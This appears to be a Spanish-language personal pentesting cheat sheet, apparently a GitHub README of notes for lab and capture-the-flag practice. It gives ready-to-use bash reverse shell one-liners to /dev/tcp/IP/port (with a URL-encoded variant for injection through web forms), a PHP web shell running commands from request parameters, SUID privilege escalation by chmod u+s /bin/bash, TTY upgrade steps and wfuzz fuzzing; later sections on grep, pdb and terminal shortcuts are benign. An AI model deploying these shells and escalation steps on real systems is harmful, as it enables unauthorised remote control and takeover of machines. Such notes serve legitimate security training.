# Acordeon

## S4vitar extractports


```bash

# Used: 
# nmap -p- --open -T5 -v -n ip -oG allPorts

# Extract nmap information
# Run as: 
# extractPorts allPorts
function extractPorts(){
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address"  >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
	cat extractPorts.tmp; rm extractPorts.tmp
}
```

## Fully TTYs

```bash

script /dev/null -c bash
CTRL+Z
stty -echo raw;fg
    reset
export TERM=xterm
export SHELL=bash
stty size # por si no sabes las medidas de tu pantalla
stty rows  51 columns 189
```

## Python Fully TTY

> https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys

````python 

python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
````


## Spawn shells

Recuerda cuando estes en una web e intentes ejecutar una reverse shell. Cambia el & por %26 

```bash

bash -c "bash -i >%26 /dev/tcp/IP/port 0>%261"
bash -c "bash -i >& /dev/tcp/IP/port 0>&1"

```

## Sudo

```
sudo -u asuser whoami

```


## Enum

```
lsb_release -a
systemctl-timers
watch -n 1 ls -l /bin/bash # ver cada segundo ese comando
```

## Find 

```
find \-perm -4000 2>/dev/null #SUID

```

## SUID

```python

import os

os.system("chmod u+s /bin/bash")

```

## WFUZZ

```
wfuzz -c --hc=404 -t 200 -w rockyou.txt http://example.com/FUZZ
## Follow redirect
-L

```

## PHP reverse shell 


```php
<?php

echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";

?>

```
Existen variantes...

```php



```


## mkdir crear mas de un directorio 

```bash
mkdir -p /uno/subdirectorio2/tres
```


## Shebang

```bash
#!/bin/bash

chmod u+s /bin/bash

```

## Grep -P -E

### grep -E:

> La opción -E habilita el uso de expresiones regulares extendidas (ERE).En las expresiones regulares extendidas, ciertos caracteres especiales como +, ?, () tienen significados especiales sin necesidad de ser precedidos por un carácter de escape \.
Por ejemplo, con grep -E, puedes utilizar + para representar "uno o más repeticiones", y no necesitas escaparlo como \+.

```
grep -Ei "user|pass|note|key"

````

En el ejemplo anterior va a buscar esos strings es como or el | 

### grep -P 

> La opción -P habilita el uso de expresiones regulares de Perl (PCRE).Las expresiones regulares de Perl son más poderosas y flexibles que las expresiones regulares básicas (BRE) o extendidas (ERE).

> Permite utilizar la mayoría de las características avanzadas de Perl en las expresiones regulares, como el uso de (?...) para grupos no capturadores, lookaheads, lookbehinds, etc. Es especialmente útil si necesitas características más avanzadas que las proporcionadas por las expresiones regulares básicas o extendidas.


## Ascii

```
man ascii
# Por ejemplo para imprimir el guion si es un bad char

printf "\055"; echo
guion=$(printf "\055")
## Ahora por ejemplo de hacer que el / que es un bad char supongamos que  la variable env es /

comando con guiones | sed 's/\//${HOME}/g' # esto lo que hace es donde encuentre un / lo va substituir por lo que valga $HOME
```

## Python break points

Para esto se necesita importar la libreria pdb 

```python3
#pip uninstall pyelftools -y
#pip install pyelftools==0.29

 
from pwn import * 

import requests
import pdb# break point--------------------------------------------------------------------------->
import signal#USas signal para capturar el CTRL+C
import sys
import urllib3
import time# aqui se usa time.sleep
import re # explresiones regulares

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)


#CTRL+C
signal.signal(signal.SIGINT, def_handler)

main_url="https://10.129.68.239/index.php"

def executeCommand():
        s=requests.session()
        urllib3.disable_warnings()
        s.verify = False
        r = s.get(main_url)
        pdb.set_trace()#break point------------------------------------------------------------->
        #print(r.text)<


if __name__== '__main__':
#       time.sleep(10)
        executeCommand()


```

Cuando ejecutas el programa entra en una especie de depurador de consola algunos comandos son: aprieta l

![image](https://github.com/gecr07/Acordeon/assets/63270579/ef1babf7-f3be-4693-a6a3-5ea5f907c6b7)

> https://realpython.com/python-debugging-pdb/

![image](https://github.com/gecr07/Acordeon/assets/63270579/92c89275-1dfd-41e2-ba62-a2f89265958d)

Ahora quiero ver la repuesta recuerda que al final por detras todo tiene clases entonces:

![image](https://github.com/gecr07/Acordeon/assets/63270579/f08b5052-a678-49fb-9cf5-bd9b4b21cfdf)

Nos va a mostrar el html:

![image](https://github.com/gecr07/Acordeon/assets/63270579/46e077e1-320d-4ca2-b790-d85eb6d0e98d)

## Terminal Shortcuts

```bash

Terminal 

CTRL + A #Ir al incio
CTRL + E # Ir al final 
ALT + B # Una palabra antes (Before)
ALT + F # Para adelante

Man 

CTRl + Shift #Buscar
n # para buscar adelante
shift + n ( osea N) # para buscar hacia atras
g Ir a la primera linea del manual man

TMUX

CTRL + B Shift + ! # Para un panel convertirlo en una ventana nueva.
CTRL + B Shift + [ # Para copiar se hace
Copy mode CTRL + Space # Selecciona 
CTRL + W # Eso es copia
CTRL + B + SHIFT + ] # pega lo copiado
#Buscar
Ya en el copy mode
CTRL + s
CTRL + r
n # para buscar en de abajo para arriba otra concidencia
SHIFT + n # para buscar en orden inverso.
```

> https://superuser.com/questions/231002/how-can-i-search-within-the-output-buffer-of-a-tmux-shell






























































